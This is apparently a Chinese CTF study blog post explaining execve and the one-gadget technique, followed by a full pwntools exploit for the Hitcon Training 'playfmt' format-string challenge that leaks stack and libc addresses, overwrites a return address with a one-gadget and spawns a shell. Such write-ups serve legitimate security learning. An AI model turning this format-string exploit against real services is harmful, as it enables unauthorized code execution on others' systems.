---
title: One gadget
date: 2022-03-13 18:52:05
tags:
    - 格式化字符串

---

<!--more-->

# 学习One gadget 

one gadget最终是执行的execve("/bin/sh",argv,envp)，以下是函数原型

```
#include <unistd.h>

int execve(const char *pathname, char *const argv[],
           char *const envp[]);


```

## 前提概述

### 函数功能：

1.执行pathname指定的程序（创建新进程），pathname 是二进制程序或是可执行脚本（通常用来执行"/bin/sh"）

数据类型：const char *pathname 字符串常量

2.argv 是传给新程序的参数列表

数据类型：char *const argv[] 字符串数组常量

3.envp 是新程序的环境变量列表，通常是key=value的形式

数据类型：char *const envp[] 字符串数组常量

### 注意：

```
argv 和 envp 数组的末尾必须是一个空指针（NULL pointer）
```

在execve的三个参数中，首个参数pathname显然是最重要的，这点可以从官方手册的描述中看出来。说到pathname时用的词是must，而到了argv和envp则说By convention或是conventionally。

也就是说argv和envp这两个参数的限制没那么严格，按照惯例argv[0]是被执行程序的程序名，但也可以不是；按照惯例环境变量应该是key=value的格式，但也可以不是。

## One gadget

在rop攻击中，讲究的是团队合作，每个人(gadget)的能力有限，只能完成部分工作，因此需要大家互相配合一起完成任务。而one gadget是个人能力超群，以一人之力便可完成全部任务的地表最强gadget。


one gadget虽然强大，但是却存在限制条件，以libc2.30为例：（可以通过one_gadget工具进行查看libc中存在的one gadget）

![image-20220313151728304](https://s2.loli.net/2022/03/26/4WzFJNmM7reAVbI.png)

这里虽然只显示了4个one gadget，但实际上libc中并不是只有这4个one gadget。

one_gadget命令默认显示的是限制条件比较宽泛的one gadget，通过-l参数指定搜索级别，显示更多的one gadget

## 样例

以Hitcon Trainning playfmt为例，使用onegadget解题

先onegadget获取一下libc的可使用情况

![image-20220313162955055](https://s2.loli.net/2022/03/26/htowqRFExBQVm8f.png)

这边我随便使用了第二个0x3d2a5为gadget的基地址

![image-20220313163421352](https://s2.loli.net/2022/03/26/ve79insFGoChLWd.png)

然后我们这次主要目的是覆盖这个__libc_start_main的地址，覆盖为onegadget，但是这里有两个 \__libc_start_main,经过调试后可以发现真正用的是第二个，所以我们要把ebp的指针指向偏移为0x24的_libc_start_main地址

![image-20220313163752855](https://s2.loli.net/2022/03/26/rdsc3Nf1T9m4bwX.png)

然后可以看到system函数和_libc_start_main后三个字节不一样，所以我们要进想两次地址写入，第一次写两字节的低地址，第二次写入高地址的第二字节

然后给EXP吧

```
#!/usr/bin/env python 
#_*_ coding:utf-8 _*_ 
from pwn import *
context.log_level='debug'
sh=process('./playfmt')
elf=ELF('./playfmt')
libc=ELF('/lib/i386-linux-gnu/libc.so.6')

printf_got = elf.got['printf']
printf_libc = libc.symbols['printf']
system_libc = libc.symbols['system']
def b(addr):
    bk = "b *" + str(addr)
    gdb.attach(sh, bk)
    success("attach")
def check():
    sh.sendline('yes!')
    while True:
        sh.sendline('yes!')
        sleep(0.1)
        if sh.recv().find('yes!') != -1:
            break
sh.sendline('aaaa%6$pbbbb%15$p')
sh.recvuntil('aaaa')
#上面内容还是和我上一篇文章一样，第一步都要先泄露地址
stack=int(sh.recv(10),16)+0x24
log.success("stack-->{}".format(hex(stack)))
sh.recvuntil('bbbb')
libc_base=int(sh.recv(10),16)+0x18fa1
log.success("libc_base-->{}".format(hex(libc_base)))
system_addr=system_libc+libc_base
onegadget=libc_base+0x3d2a5
log.success('one-->{}'.format(hex(onegadget)))
#b(0x804853B)
payload="%"+str((stack)&0xff)+"c"+"%6$hhn"
sh.sendline(payload)
sleep(0.3)
check()
payload='%'+str(onegadget&0xffff)+'c%10$hn'#写入低地址两字节
sh.sendline(payload)
sleep(0.3)
check()
payload='%'+str((stack+2)&0xff)+'c%6$hhn'#写入高地址的第二字节
sh.sendline(payload)
sleep(0.3)
check()
#b(0x804853B)
payload='%'+str((onegadget>>16)&0xff)+'c%10$hhn'
sh.sendline(payload)
sleep(0.3)
check()
#修复ebp，这道题因为使用onegadget后ebp会发生改变报错
payload='%'+str((stack-0x14)&0xff)+'c%6$hhn'
sh.sendline(payload)
b(0x804853B)
sh.sendline('quit')
#sh.sendline("/bin/sh")
sleep(0.3)
sh.interactive()
sh.close()
```

## 参考学习

TaQini师傅的链接: http://taqini.space/2020/04/29/about-execve/



